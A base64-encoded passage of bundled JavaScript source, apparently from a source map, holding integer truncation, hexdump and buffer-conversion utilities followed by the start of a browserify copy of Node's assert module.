ICsgcy5zaXplO1xuXHRcdFx0c2l6ZSA9IHMuc2l6ZTtcblx0XHR9IGVsc2UgaWYocy5zb3VyY2VFbmQgJiYgIXMuc2l6ZSAmJiAhcy50YXJnZXRFbmQpIHtcblx0XHRcdHNlID0gcy5zb3VyY2VFbmQ7XG5cdFx0XHRzaXplID0gcy5zb3VyY2VFbmQgLSBzYjtcblx0XHRcdHRlID0gcy50YiArIHNpemU7XG5cdFx0fSBlbHNlIGlmKHMudGFyZ2V0RW5kIC0gdGIgPT09IHMuc291cmNlRW5kIC0gc2IpIHtcblx0XHRcdHNpemUgPSBzLnRhcmdldEVuZCAtIHRiO1xuXHRcdFx0aWYocy5zaXplICYmIHMuc2l6ZSAhPT0gc2l6ZSkge1xuXHRcdFx0XHR0aHJvdyBcInNpemUgZG9lcyBub3QgbWF0Y2hcIjtcblx0XHRcdH1cblx0XHR9IGVsc2Uge1xuXHRcdFx0dGhyb3cgXCJiaXRmaWVsZCBzcGVjIG51bWJlciBcIiArIGkgKyBcIiBuZWVkcyBvbmUgb2YgdGFyZ2V0RW5kLCBzaXplLCBvciBzb3VyY2VFbmRcIjtcblx0XHR9XG5cblx0XHRyZXR1cm4gKChiaXRmaWVsZCA+PiB0YikgJiAoKDE8PHNpemUpLTEpKSA8PCBzYjtcblx0fSk7XG59O1xuXG5leHBvcnRzLmFzc2VydHUzMiA9IGZ1bmN0aW9uIChudW0pIHtcblx0aWYoIU51bWJlci5pc0ludGVnZXIobnVtKSkge1xuXHRcdHRocm93IG5ldyBFcnJvcihcImV4cGVjdGVkIGludGVnZXJcIik7XG5cdH1cblx0aWYobnVtID4gMHhGRkZGRkZGRikge1xuXHRcdHRocm93IG5ldyBFcnJvcihcInRvbyBsYXJnZSBmb3IgdTMyXCIpO1xuXHR9XG5cdGlmKG51bSA8IDApIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJleHBlY3RlZCBwb3NpdGl2ZSBpbnRlZ2VyXCIpO1xuXHR9XG5cdHJldHVybiBudW07XG59O1xuXG5leHBvcnRzLmFzc2VydHU2NCA9IGZ1bmN0aW9uIChhcnIpIHtcblx0aWYoIUFycmF5LmlzQXJyYXkoYXJyKSkge1xuXHRcdHRocm93IG5ldyBFcnJvcihcImV4cGVjdGVkIGFycmF5XCIpO1xuXHR9XG5cdGlmKGFyci5sZW5ndGggIT09IDIpIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJleHBlY3RlZCBbbG8sIGhpXSBwYWlyXCIpO1xuXHR9XG5cdHJldHVybiBbdGhpcy5hc3NlcnR1MzIoYXJyWzBdKSwgdGhpcy5hc3NlcnR1MzIoYXJyWzFdKV07XG59O1xuXG5leHBvcnRzLnRydW5jMzIgPSBmdW5jdGlvbiAobnVtKSB7XG5cdGlmKEFycmF5LmlzQXJyYXkobnVtKSkge1xuXHRcdGlmKG51bVsxXSAhPT0gMCkge1xuXHRcdFx0dGhyb3cgbmV3IEVycm9yKFwiaGlnaCAzMiBiaXRzIG11c3QgYmUgY2xlYXJcIik7XG5cdFx0fVxuXHRcdHJldHVybiB0aGlzLmFzc2VydHUzMihudW1bMF0pO1xuXHR9IGVsc2UgaWYodHlwZW9mKG51bSkgPT09IFwibnVtYmVyXCIpIHtcblx0XHRyZXR1cm4gdGhpcy5hc3NlcnR1MzIobnVtKTtcblx0fSBlbHNlIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJleHBlY3RlZCBbbG8saGldIG9yIHUzMlwiKTtcblx0fVxufTtcblxuLy8gdHJ1bmNhdGUgdG8gbGVzcyB0aGFuIDMyIGJpdHMsIHdpbGwgYWx3YXlzIHJldHVybiBudW1iZXJcbi8vIHRocm93IHdoZW4gdHJ1bmNhdGluZyBub24temVybyBiaXRzXG5leHBvcnRzLnRydW5jbHQzMiA9IGZ1bmN0aW9uIChudW0sIGJpdHMpIHtcblx0aWYoYml0cyA+IDMyKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKFwiY2FuJ3QgdHJ1bmNhdGUgPiAzMiBiaXRzIHdpdGggdHJ1bmNsdDMyXCIpO1xuXHR9XG5cdGlmKEFycmF5LmlzQXJyYXkobnVtKSAmJiB0aGlzLmFzc2VydHU2NChudW0pKSB7XG5cdFx0aWYobnVtWzFdICE9PSAwKSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJoaWdoIFwiICsgKDY0LWJpdHMpICsgXCIgYml0cyBtdXN0IGJlIGNsZWFyXCIpO1xuXHRcdH1cblx0XHRudW0gPSB0aGlzLmFzc2VydHUzMihudW1bMF0pO1xuXHR9IGVsc2UgaWYodHlwZW9mKG51bSkgPT09IFwibnVtYmVyXCIpIHtcblx0XHRudW0gPSB0aGlzLmFzc2VydHUzMihudW0pO1xuXHR9IGVsc2Uge1xuXHRcdHRocm93IG5ldyBFcnJvcihcImV4cGVjdGVkIFtsbyxoaV0gb3IgdTMyXCIpO1xuXHR9XG5cdC8vIGZvciBzb21lIHJlYXNvbiwgYSA+PiAzMiA9PSBhLiB0aGF0IG1ha2VzIGxpdGVyYWxseSBubyBzZW5zZS5cblx0aWYoYml0cyA9PSAzMiA/IDAgOiAobnVtID4+IGJpdHMpID4gMCkge1xuXHRcdHRocm93IG5ldyBFcnJvcihcIm51bWJlciBpcyB0b28gbGFyZ2UgZm9yIFwiICsgYml0cyArIFwiIGJpdHNcIik7XG5cdH1cblx0cmV0dXJuIG51bTtcbn07XG5cbi8vIHRydW5jYXRlIHRvIGxlc3MgdGhhbiA2NCBiaXRzLCB3aWxsIGFsd2F5cyByZXR1cm4gW2xvLCBoaV1cbi8vIHRocm93IHdoZW4gdHJ1bmNhdGluZyBub24temVybyBiaXRzXG5leHBvcnRzLnRydW5jbHQ2NCA9IGZ1bmN0aW9uIChudW0sIGJpdHMpIHtcblx0bnVtID0gdGhpcy5wYWQ2NChudW0pO1xuXHRpZih0aGlzLmJpdHMgPD0gMzIpIHtcblx0XHRyZXR1cm4gW3RoaXMudHJ1bmNsdDMyKG51bSksIDBdO1xuXHR9XG5cdC8vIGZvciBzb21lIHJlYXNvbiwgYSA+PiAzMiA9PSBhLiB0aGF0IG1ha2VzIGxpdGVyYWxseSBubyBzZW5zZS5cblx0aWYoYml0cyA9PSA2NCA/IDAgOiAobnVtWzFdID4+IChiaXRzLTMyKSkgPiAwKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKFwibnVtYmVyIGlzIHRvbyBsYXJnZSBmb3IgXCIgKyBiaXRzICsgXCIgYml0c1wiKTtcblx0fVxuXHRyZXR1cm4gbnVtO1xufTtcblxuZXhwb3J0cy5wYWQ2NCA9IGZ1bmN0aW9uIChudW0pIHtcblx0aWYoQXJyYXkuaXNBcnJheShudW0pKSB7XG5cdFx0cmV0dXJuIHRoaXMuYXNzZXJ0dTY0KG51bSk7XG5cdH0gZWxzZSBpZih0eXBlb2YobnVtKSA9PT0gXCJudW1iZXJcIikge1xuXHRcdHJldHVybiBbdGhpcy5hc3NlcnR1MzIobnVtKSwgMF07XG5cdH0gZWxzZSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKFwiZXhwZWN0ZWQgW2xvLGhpXSBvciBudW1iZXJcIik7XG5cdH1cbn07XG5cbmNvbnNvbGUgPSB7XG5cdGxvZzogZnVuY3Rpb24gKG1zZykge1xuXHRcdGV4cG9ydHMuc2VuZCgnbG9nJywgbXNnKTtcblx0fVxufTtcblxudmFyIGxvZyA9IGNvbnNvbGUubG9nO1xuXG5leHBvcnRzLmxvZyA9IGxvZztcblxuZXhwb3J0cy5kdW1wID0gZnVuY3Rpb24gKG5hbWUsIGJ1ZiwgY291bnQpIHtcblx0Zm9yICh2YXIgaiA9IDA7IGogPCBjb3VudDsgKytqKSB7IHV0aWxzLmxvZyhuYW1lICsgJ1snICsgaiArICddID09IDB4JyArIGJ1ZltqXS50b1N0cmluZygxNikpOyB9XG59O1xuXG5leHBvcnRzLmhleGR1bXAgPSBmdW5jdGlvbiAobmFtZSwgaW5wLCBjb3VudCkge1xuXHR2YXIgYnVmO1xuXHR2YXIgdThiO1xuXG5cdGlmIChpbnAgaW5zdGFuY2VvZiBBcnJheUJ1ZmZlciB8fCBpbnAgaW5zdGFuY2VvZiBVaW50MzJBcnJheSkge1xuXHRcdGJ1ZiA9IGlucDtcblx0XHR1OGIgPSBuZXcgVWludDhBcnJheSgoaW5wIGluc3RhbmNlb2YgQXJyYXlCdWZmZXIpID8gYnVmIDogYnVmLmJ1ZmZlcik7XG5cdFx0aWYgKGNvdW50ID09PSB1bmRlZmluZWQpIHtcblx0XHRcdGNvdW50ID0gdThiLmxlbmd0aDtcblx0XHR9XG5cdH0gZWxzZSB7XG5cdFx0YnVmID0gbmV3IEFycmF5QnVmZmVyKGlucC5sZW5ndGggKiA0KTtcblx0XHR2YXIgdTMyYiA9IG5ldyBVaW50MzJBcnJheShidWYpO1xuXHRcdHU4YiA9IG5ldyBVaW50OEFycmF5KGJ1Zik7XG5cdFx0aWYgKGNvdW50ID09PSB1bmRlZmluZWQpIHtcblx0XHRcdGNvdW50ID0gdThiLmxlbmd0aDtcblx0XHR9XG5cdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCBpbnAubGVuZ3RoICYmIGkgPCBjb3VudDsgaSsrKSB7XG5cdFx0XHR1MzJiW2ldID0gaW5wW2ldO1xuXHRcdH1cblx0fVxuXHR2YXIgcm93cyA9IE1hdGguY2VpbChjb3VudCAvIDE2LjApO1xuXHR2YXIgYWRkckNvbHVtbldpZHRoID0gKG5hbWUgKyAnKzB4JyArIChyb3dzICogMTYpLnRvU3RyaW5nKDE2KSkubGVuZ3RoO1xuXHR2YXIgZHVtcFdpZHRoID0gKDMgKiAxNikgKyAxOyAvLyAyIGNoYXJhY3RlcnMgKyAxIHNwYWNlIGZvciBlYWNoIG9mIHRoZSAxNiBieXRlcywgYW5kIHRoZSBzcGFjZSBiZXR3ZWVuIHUzMnNcblxuXHRmdW5jdGlvbiByanVzdCAoc3RyaW5nLCB3aWR0aCwgY2hyKSB7XG5cdFx0dmFyIGZpbGwgPSAnJztcblx0XHR3aGlsZSAoZmlsbC5sZW5ndGggPCB3aWR0aCAtIHN0cmluZy5sZW5ndGgpIHtcblx0XHRcdGZpbGwgKz0gY2hyO1xuXHRcdH1cblx0XHRyZXR1cm4gZmlsbCArIHN0cmluZztcblx0fVxuXG5cdGZ1bmN0aW9uIGxqdXN0IChzdHJpbmcsIHdpZHRoLCBjaHIpIHtcblx0XHR2YXIgZmlsbCA9ICcnO1xuXHRcdHdoaWxlIChmaWxsLmxlbmd0aCA8IHdpZHRoIC0gc3RyaW5nLmxlbmd0aCkge1xuXHRcdFx0ZmlsbCArPSBjaHI7XG5cdFx0fVxuXHRcdHJldHVybiBzdHJpbmcgKyBmaWxsO1xuXHR9XG5cblx0Zm9yIChpID0gMDsgaSA8IHJvd3M7IGkrKykge1xuXHRcdHZhciBvZmZzZXQgPSBpICogMTY7XG5cdFx0dmFyIGhleGxpbmVkdW1wID0gJyc7XG5cdFx0dmFyIGFzY2lpbGluZWR1bXAgPSAnJztcblx0XHRmb3IgKHZhciBqID0gMDsgaiA8IDE2ICYmIG9mZnNldCArIGogPCBjb3VudDsgaisrKSB7XG5cdFx0XHRpZiAoaiAhPT0gMCkge1xuXHRcdFx0XHRoZXhsaW5lZHVtcCArPSAnICc7XG5cdFx0XHR9XG5cdFx0XHRoZXhsaW5lZHVtcCArPSByanVzdCh1OGJbb2Zmc2V0ICsgal0udG9TdHJpbmcoMTYpLCAyLCAnMCcpO1xuXHRcdFx0aWYgKGogPT09IDcpIGhleGxpbmVkdW1wICs9ICcgJztcblxuXHRcdFx0YXNjaWlsaW5lZHVtcCArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHU4YltvZmZzZXQgKyBqXSkucmVwbGFjZSgvW15cXHgyMC1cXHg3RV0rL2csICcuJyk7XG5cdFx0fVxuXHRcdHZhciBsaW5lZHVtcCA9IGxqdXN0KGhleGxpbmVkdW1wLCBkdW1wV2lkdGgsICcgJykgKyAnfCAnICsgbGp1c3QoYXNjaWlsaW5lZHVtcCwgMTYsICcgJykgKyAnIHwnO1xuXHRcdHV0aWxzLmxvZyhsanVzdChuYW1lICsgJysweCcgKyBvZmZzZXQudG9TdHJpbmcoMTYpLCBhZGRyQ29sdW1uV2lkdGgsICcgJykgKyAnIHwgJyArIGxpbmVkdW1wKTtcblx0fVxufTtcblxuZXhwb3J0cy5zdHIyYWIgPSBmdW5jdGlvbiAoc3RyLCBsZW5ndGgpIHtcblx0aWYobGVuZ3RoID09PSB1bmRlZmluZWQpIHtcblx0XHRsZW5ndGggPSBzdHIubGVuZ3RoICsgMTtcblx0fSBlbHNlIHtcblx0XHRpZihsZW5ndGggPCBzdHIubGVuZ3RoICsgMSkge1xuXHRcdFx0dGhyb3cgbmV3IEVycm9yKFwiYnVmZmVyIGlzIHRvbyBzbWFsbCB0byBwYWNrIHN0cmluZ1wiKTtcblx0XHR9XG5cdH1cblx0dmFyIGFiID0gbmV3IEFycmF5QnVmZmVyKGxlbmd0aCk7XG5cdHZhciB1OCA9IG5ldyBVaW50OEFycmF5KGFiKTtcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyBpKyspIHtcblx0XHR1OFtpXSA9IHN0ci5jaGFyQ29kZUF0KGkpO1xuXHR9XG5cdHU4W3N0ci5sZW5ndGggKyAxXSA9IDA7XG5cdHJldHVybiBhYjtcbn07XG5cbmV4cG9ydHMudThhMnN0ciA9IGZ1bmN0aW9uICh1OCkge1xuXHR2YXIgc3RyID0gXCJcIjtcblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB1OC5sZW5ndGg7IGkrKykge1xuXHRcdHN0cis9IFN0cmluZy5mcm9tQ2hhckNvZGUodThbaV0pO1xuXHR9XG5cdHJldHVybiBzdHI7XG59O1xuXG5leHBvcnRzLnU4YTJudWxsc3RyID0gZnVuY3Rpb24gKHU4KSB7XG5cdHZhciBzdHIgPSBcIlwiO1xuXHRmb3IgKHZhciBpID0gMDsgaSA8IHU4Lmxlbmd0aDsgaSsrKSB7XG5cdFx0aWYodThbaV0gPT09IDApIHtcblx0XHRcdGJyZWFrO1xuXHRcdH1cblx0XHRzdHIrPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHU4W2ldKTtcblx0fVxuXHRyZXR1cm4gc3RyO1xufTtcblxuZXhwb3J0cy5zdHIydTY0ID0gZnVuY3Rpb24gKGlucCkge1xuXHRpZiAoaW5wLmxlbmd0aCA+IDgpIHtcblx0XHR0aHJvdyBuZXcgRXJyb3IoXCJzdHJpbmcgdG9vIGxvbmdcIik7XG5cdH1cblx0aWYgKGlucC5sZW5ndGggPT09IDApIHtcblx0XHRyZXR1cm4gWzAsIDBdO1xuXHR9XG5cdHZhciBsZW4gPSA4O1xuXHR2YXIgYnVmID0gbmV3IEFycmF5QnVmZmVyKGxlbik7XG5cdHZhciB1OGIgPSBuZXcgVWludDhBcnJheShidWYpO1xuXHRmb3IgKHZhciBqID0gMDsgaiA8IGlucC5sZW5ndGg7ICsraikgeyB1OGJbal0gPSBpbnAuY2hhckNvZGVBdChqKTsgfVxuXHRmb3IgKGogPSBpbnAubGVuZ3RoOyBqIDwgbGVuOyArK2opIHsgdThiW2pdID0gMDsgfVxuXG5cdHZhciB1MzJiID0gbmV3IFVpbnQzMkFycmF5KGJ1Zik7XG5cdHJldHVybiBbdTMyYlswXSwgdTMyYlsxXV07XG59O1xuIiwiJ3VzZSBzdHJpY3QnO1xuXG4vLyBjb21wYXJlIGFuZCBpc0J1ZmZlciB0YWtlbiBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9mZXJvc3MvYnVmZmVyL2Jsb2IvNjgwZTllNWU0ODhmMjJhYWMyNzU5OWE1N2RjODQ0YTYzMTU5MjhkZC9pbmRleC5qc1xuLy8gb3JpZ2luYWwgbm90aWNlOlxuXG4vKiFcbiAqIFRoZSBidWZmZXIgbW9kdWxlIGZyb20gbm9kZS5qcywgZm9yIHRoZSBicm93c2VyLlxuICpcbiAqIEBhdXRob3IgICBGZXJvc3MgQWJvdWtoYWRpamVoIDxmZXJvc3NAZmVyb3NzLm9yZz4gPGh0dHA6Ly9mZXJvc3Mub3JnPlxuICogQGxpY2Vuc2UgIE1JVFxuICovXG5mdW5jdGlvbiBjb21wYXJlKGEsIGIpIHtcbiAgaWYgKGEgPT09IGIpIHtcbiAgICByZXR1cm4gMDtcbiAgfVxuXG4gIHZhciB4ID0gYS5sZW5ndGg7XG4gIHZhciB5ID0gYi5sZW5ndGg7XG5cbiAgZm9yICh2YXIgaSA9IDAsIGxlbiA9IE1hdGgubWluKHgsIHkpOyBpIDwgbGVuOyArK2kpIHtcbiAgICBpZiAoYVtpXSAhPT0gYltpXSkge1xuICAgICAgeCA9IGFbaV07XG4gICAgICB5ID0gYltpXTtcbiAgICAgIGJyZWFrO1xuICAgIH1cbiAgfVxuXG4gIGlmICh4IDwgeSkge1xuICAgIHJldHVybiAtMTtcbiAgfVxuICBpZiAoeSA8IHgpIHtcbiAgICByZXR1cm4gMTtcbiAgfVxuICByZXR1cm4gMDtcbn1cbmZ1bmN0aW9uIGlzQnVmZmVyKGIpIHtcbiAgaWYgKGdsb2JhbC5CdWZmZXIgJiYgdHlwZW9mIGdsb2JhbC5CdWZmZXIuaXNCdWZmZXIgPT09ICdmdW5jdGlvbicpIHtcbiAgICByZXR1cm4gZ2xvYmFsLkJ1ZmZlci5pc0J1ZmZlcihiKTtcbiAgfVxuICByZXR1cm4gISEoYiAhPSBudWxsICYmIGIuX2lzQnVmZmVyKTtcbn1cblxuLy8gYmFzZWQgb24gbm9kZSBhc3NlcnQsIG9yaWdpbmFsIG5vdGljZTpcblxuLy8gaHR0cDovL3dpa2kuY29tbW9uanMub3JnL3dpa2kvVW5pdF9UZXN0aW5nLzEuMFxuLy9cbi8vIFRISVMgSVMgTk9UIFRFU1RFRCBOT1IgTElLRUxZIFRPIFdPUksgT1VUU0lERSBWOCFcbi8vXG4vLyBPcmlnaW5hbGx5IGZyb20gbmFyd2hhbC5qcyAoaHR0cDovL25hcndoYWxqcy5vcmcpXG4vLyBDb3B5cmlnaHQgKGMpIDIwMDkgVGhvbWFzIFJvYmluc29uIDwyODBub3J0aC5jb20+XG4vL1xuLy8gUGVybWlzc2lvbiBpcyBoZXJlYnkgZ3JhbnRlZCwgZnJlZSBvZiBjaGFyZ2UsIHRvIGFueSBwZXJzb24gb2J0YWluaW5nIGEgY29weVxuLy8gb2YgdGhpcyBzb2Z0d2FyZSBhbmQgYXNzb2NpYXRlZCBkb2N1bWVudGF0aW9uIGZpbGVzICh0aGUgJ1NvZnR3YXJlJyksIHRvXG4vLyBkZWFsIGluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZVxuLy8gcmlnaHRzIHRvIHVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCwgZGlzdHJpYnV0ZSwgc3VibGljZW5zZSwgYW5kL29yXG4vLyBzZWxsIGNvcGllcyBvZiB0aGUgU29mdHdhcmUsIGFuZCB0byBwZXJtaXQgcGVyc29ucyB0byB3aG9tIHRoZSBTb2Z0d2FyZSBpc1xuLy8gZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczpcbi8vXG4vLyBUaGUgYWJvdmUgY29weXJpZ2h0IG5vdGljZSBhbmQgdGhpcyBwZXJtaXNzaW9uIG5vdGljZSBzaGFsbCBiZSBpbmNsdWRlZCBpblxuLy8gYWxsIGNvcGllcyBvciBzdWJzdGFudGlhbCBwb3J0aW9ucyBvZiB0aGUgU29mdHdhcmUuXG4vL1xuLy8gVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICdBUyBJUycsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1Jcbi8vIElNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLFxuLy8gRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UgQU5EIE5PTklORlJJTkdFTUVOVC4gSU4gTk8gRVZFTlQgU0hBTEwgVEhFXG4vLyBBVVRIT1JTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSIExJQUJJTElUWSwgV0hFVEhFUiBJTiBBTlxuLy8gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLCBPVVQgT0YgT1IgSU4gQ09OTkVDVElPTlxuLy8gV0lUSCBUSEUgU09GVFdBUkUgT1IgVEhFIFVTRSBPUiBPVEhFUiBERUFMSU5HUyBJTiBUSEUgU09GVFdBUkUuXG5cbnZhciB1dGlsID0gcmVxdWlyZSgndXRpbC8nKTtcbnZhciBoYXNPd24gPSBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5O1xudmFyIHBTbGljZSA9IEFycmF5LnByb3RvdHlwZS5zbGljZTtcbnZhciBmdW5jdGlvbnNIYXZlTmFtZXMgPSAoZnVuY3Rpb24gKCkge1xuICByZXR1cm4gZnVuY3Rpb24gZm9vKCkge30ubmFtZSA9PT0gJ2Zvbyc7XG59KCkpO1xuZnVuY3Rpb24gcFRvU3RyaW5nIChvYmopIHtcbiAgcmV0dXJuIE9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbChvYmopO1xufVxuZnVuY3Rpb24gaXNWaWV3KGFycmJ1Zikge1xuICBpZiAoaXNCdWZmZXIoYXJyYnVmKSkge1xuICAgIHJldHVybiBmYWxzZTtcbiAgfVxuICBpZiAodHlwZW9mIGdsb2JhbC5BcnJheUJ1ZmZlciAhPT0gJ2Z1bmN0aW9uJykge1xuICAgIHJldHVybiBmYWxzZTtcbiAgfVxuICBpZiAodHlwZW9mIEFycmF5QnVmZmVyLmlzVmlldyA9PT0gJ2Z1bmN0aW9uJykge1xuICAgIHJldHVybiBBcnJheUJ1ZmZlci5pc1ZpZXcoYXJyYnVmKTtcbiAgfVxuICBpZiAoIWFycmJ1Zikge1xuICAgIHJldHVybiBmYWxzZTtcbiAgfVxuICBpZiAoYXJyYnVmIGluc3RhbmNlb2YgRGF0YVZpZXcpIHtcbiAgICByZXR1cm4gdHJ1ZTtcbiAgfVxuICBpZiAoYXJyYnVmLmJ1ZmZlciAmJiBhcnJidWYuYnVmZmVyIGluc3RhbmNlb2YgQXJyYXlCdWZmZXIpIHtcbiAgICByZXR1cm4gdHJ1ZTtcbiAgfVxuICByZXR1cm4gZmFsc2U7XG59XG4vLyAxLiBUaGUgYXNzZXJ0IG1vZHVsZSBwcm92aWRlcyBmdW5jdGlvbnMgdGhhdCB0aHJvd1xuLy8gQXNzZXJ0aW9uRXJyb3IncyB3aGVuIHBhcnRpY3VsYXIgY29uZGl0aW9ucyBhcmUgbm90IG1ldC4gVGhlXG4vLyBhc3NlcnQgbW9kdWxlIG11c3QgY29uZm9ybSB0byB0aGUgZm9sbG93aW5nIGludGVyZmFjZS5cblxudmFyIGFzc2VydCA9IG1vZHVsZS5leHBvcnRzID0gb2s7XG5cbi8vIDIuIFRoZSBBc3NlcnRpb25FcnJvciBpcyBkZWZpbmVkIGluIGFzc2VydC5cbi8vIG5ldyBhc3NlcnQuQXNzZXJ0aW9uRXJyb3IoeyBtZXNzYWdlOiBtZXNzYWdlLFxuLy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdHVhbDogYWN0dWFsLFxuLy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4cGVjdGVkOiBleHBlY3RlZCB9KVxuXG52YXIgcmVnZXggPSAvXFxzKmZ1bmN0aW9uXFxzKyhbXlxcKFxcc10qKVxccyovO1xuLy8gYmFzZWQgb24gaHR0cHM6Ly9naXRodWIuY29tL2xqaGFyYi9mdW5jdGlvbi5wcm90b3R5cGUubmFtZS9ibG9iL2FkZWVlZWM4YmZjYzYwNjhiMTg3ZDdkOWZiM2Q1YmIxZDNhMzA4OTkvaW1wbGVtZW50YXRpb24uanNcbmZ1bmN0aW9uIGdldE5hbWUoZnVuYykge1xuICBpZiAoIXV0aWwuaXNGdW5jdGlvbihmdW5jKSkge1xuICAgIHJldHVybjtcbiAgfVxuICBpZiAoZnVuY3Rpb25zSGF2ZU5hbWVzKSB7XG4gICAgcmV0dXJuIGZ1bmMubmFtZTtcbiAgfVxuICB2YXIgc3RyID0gZnVuYy50b1N0cmluZygpO1xuICB2YXIgbWF0Y2ggPSBzdHIubWF0Y2gocmVnZXgpO1xuICByZXR1cm4gbWF0Y2ggJiYgbWF0Y2hbMV07XG59XG5hc3NlcnQuQXNzZXJ0aW9uRXJyb3IgPSBmdW5jdGlvbiBBc3NlcnRpb25FcnJvcihvcHRpb25zKSB7XG4gIHRoaXMubmFtZSA9ICdBc3NlcnRpb25FcnJvcic7XG4gIHRoaXMuYWN0dWFsID0gb3B0aW9ucy5hY3R1YWw7XG4gIHRoaXMuZXhwZWN0ZWQgPSBvcHRpb25zLmV4cGVjdGVkO1xuICB0aGlzLm9wZXJhdG9yID0gb3B0aW9ucy5vcGVyYXRvcjtcbiAgaWYgKG9wdGlvbnMubWVzc2FnZSkge1xuICAgIHRoaXMubWVzc2FnZSA9IG9wdGlvbnMubWVzc2FnZTtcbiAgICB0aGlzLmdlbmVyYXRlZE1lc3NhZ2UgPSBmYWxzZTtcbiAgfSBlbHNlIHtcbiAgICB0aGlzLm1lc3NhZ2UgPSBnZXRNZXNzYWdlKHRoaXMpO1xuICAgIHRoaXMuZ2VuZXJhdGVkTWVzc2FnZSA9IHRydWU7XG4gIH1cbiAgdmFyIHN0YWNrU3RhcnRGdW5jdGlvbiA9IG9wdGlvbnMuc3RhY2tTdGFydEZ1bmN0aW9uIHx8IGZhaWw7XG4gIGlmIChFcnJvci5jYXB0dXJlU3RhY2tUcmFjZSkge1xuICAgIEVycm9yLmNhcHR1cmVTdGFja1RyYWNlKHRoaXMsIHN0YWNrU3RhcnRGdW5jdGlvbik7XG4gIH0gZWxzZSB7XG4gICAgLy8gbm9uIHY4IGJyb3dzZXJzIHNvIHdlIGNhbiBoYXZlIGEgc3RhY2t0cmFjZVxuICAgIHZhciBlcnIgPSBuZXcgRXJyb3IoKTtcbiAgICBpZiAoZXJyLnN0YWNrKSB7XG4gICAgICB2YXIgb3V0ID0gZXJyLnN0YWNrO1xuXG4gICAgICAvLyB0cnkgdG8gc3RyaXAgdXNlbGVzcyBmcmFtZXNcbiAgICAgIHZhciBmbl9uYW1lID0gZ2V0TmFtZShzdGFja1N0YXJ0RnVuY3Rpb24pO1xuICAgICAgdmFyIGlkeCA9IG91dC5pbmRleE9mKCdcXG4nICsgZm5fbmFtZSk7XG4gICAgICBpZiAoaWR4ID49IDApIHtcbiAgICAgICAgLy8gb25jZSB3ZSBoYXZlIGxvY2F0ZWQgdGhlIGZ1bmN0aW9uIGZyYW1lXG4gICAgICAgIC8vIHdlIG5lZWQgdG8gc3RyaXAgb3V0IGV2ZXJ5dGhpbmcgYmVmb3JlIGl0IChhbmQgaXRzIGxpbmUpXG4gICAgICAgIHZhciBuZXh0X2xpbmUgPSBvdXQuaW5kZXhPZignXFxuJywgaWR4ICsgMSk7XG4gICAgICAgIG91dCA9IG91dC5zdWJzdHJpbmcobmV4dF9saW5lICsgMSk7XG4gICAgICB9XG5cbiAgICAgIHRoaXMuc3RhY2sgPSBvdXQ7XG4gICAgfVxuICB9XG59O1xuXG4vLyBhc3NlcnQuQXNzZXJ0aW9uRXJyb3IgaW5zdGFuY2VvZiBFcnJvclxudXRpbC5pbmhlcml0cyhhc3NlcnQuQXNzZXJ0aW9uRXJyb3IsIEVycm9yKTtcblxuZnVuY3Rpb24gdHJ1bmNhdGUocywgbikge1xuICBpZiAodHlwZW9mIHMgPT09ICdzdHJpbmcnKSB7XG4gICAgcmV0dXJuIHMubGVuZ3RoIDwgbiA/IHMgOiBzLnNsaWNlKDAsIG4pO1xuICB9IGVsc2Uge1xuICAgIHJldHVybiBzO1xuICB9XG59XG5mdW5jdGlvbiBpbnNwZWN0KHNvbWV0aGluZykge1xuICBpZiAoZnVuY3Rpb25zSGF2ZU5hbWVzIHx8ICF1dGlsLmlzRnVuY3Rpb24oc29tZXRoaW5nKSkge1xuICAgIHJldHVybiB1dGlsLmluc3BlY3Qoc29tZXRoaW5nKTtcbiAgfVxuICB2YXIgcmF3bmFtZSA9IGdldE5hbWUoc29tZXRoaW5nKTtcbiAgdmFyIG5hbWUgPSByYXduYW1lID8gJzogJyArIHJhd25hbWUgOiAnJztcbiAgcmV0dXJuICdbRnVuY3Rpb24nICsgIG5hbWUgKyAnXSc7XG59XG5mdW5jdGlvbiBnZXRNZXNzYWdlKHNlbGYpIHtcbiAgcmV0dXJuIHRydW5jYXRlKGluc3BlY3Qoc2VsZi5hY3R1YWwpLCAxMjgpICsgJyAnICtcbiAgICAgICAgIHNlbGYub3BlcmF0b3IgKyAnICcgK1xuICAgICAgICAgdHJ1bmNhdGUoaW5zcGVjdChzZWxmLmV4cGVjdGVkKSwgMTI4KTtcbn1cblxuLy8gQXQgcHJlc2VudCBvbmx5IHRoZSB0aHJlZSBrZXlzIG1lbnRpb25lZCBhYm92ZSBhcmUgdXNlZCBhbmRcbi8vIHVuZGVyc3Rvb2QgYnkgdGhlIHNwZWMuIEltcGxlbWVudGF0aW9ucyBvciB